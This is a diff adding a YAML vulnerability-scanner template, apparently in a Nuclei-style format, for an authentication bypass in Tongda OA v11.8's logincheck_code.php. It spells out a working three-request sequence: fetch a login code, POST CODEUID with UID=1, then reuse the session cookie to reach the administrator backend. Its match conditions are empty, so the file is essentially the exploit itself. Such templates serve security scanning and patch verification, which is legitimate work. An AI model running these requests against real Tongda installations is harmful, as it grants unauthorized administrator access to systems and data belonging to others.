@@ -1,0 +1,26 @@
+id: tongda-login-code-authbypass
+brief:
+    title: Tongda OA v11.8 logincheck_code.php - Authentication Bypass
+    by: SleepingBag945
+    level: high
+    about: There is a login bypass vulnerability in Tongda OA v11.8 logincheck_code.php, through which an attacker can log in to the system administrator background
+    label:
+        - tongda
+        - authbypass
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/general/login_code.php'
+      signs: []
+    - verb: POST
+      to:
+        - '{{BaseURL}}/logincheck_code.php'
+      body: CODEUID={{uid}}&UID=1
+      signs: []
+    - verb: GET
+      to:
+        - '{{BaseURL}}/general/index.php?isIE=0&modify_pwd=0'
+      head:
+        Cookie: PHPSESSID={{cookie}};
+      signs: []
